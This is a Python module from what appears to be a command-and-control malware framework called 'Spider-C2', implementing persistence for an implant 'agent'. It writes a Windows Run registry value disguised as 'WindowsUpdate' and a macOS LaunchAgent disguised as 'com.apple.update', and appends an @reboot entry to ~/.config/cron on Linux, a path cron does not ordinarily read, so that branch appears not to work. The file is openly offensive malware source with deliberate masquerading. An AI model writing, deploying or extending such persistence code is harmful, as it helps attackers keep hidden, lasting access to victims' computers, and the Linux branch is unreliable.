"""
Spider-C2 Module : Persistence
Agent persistence mechanisms.
"""

import os
import sys
import platform
import subprocess

class PersistenceModule:
    def __init__(self):
        self.os_type = platform.system()

    def install(self, agent_path=""):
        if not agent_path:
            agent_path = sys.executable

        if self.os_type == "Windows":
            return self._windows_persistence(agent_path)
        elif self.os_type == "Linux":
            return self._linux_persistence(agent_path)
        elif self.os_type == "Darwin":
            return self._mac_persistence(agent_path)
        return False

    def _windows_persistence(self, agent_path):
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, agent_path)
            return True
        except:
            return False

    def _linux_persistence(self, agent_path):
        try:
            cron_line = f"@reboot {agent_path}\n"
            cron_path = os.path.expanduser("~/.config/cron")
            os.makedirs(os.path.dirname(cron_path), exist_ok=True)
            with open(cron_path, "a") as f:
                f.write(cron_line)
            return True
        except:
            return False

    def _mac_persistence(self, agent_path):
        try:
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array><string>{agent_path}</string></array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.update.plist")
            with open(plist_path, "w") as f:
                f.write(plist_content)
            return True
        except:
            return False

    def remove(self):
        if self.os_type == "Windows":
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.DeleteValue(regkey, "WindowsUpdate")
                return True
            except:
                return False
        return False
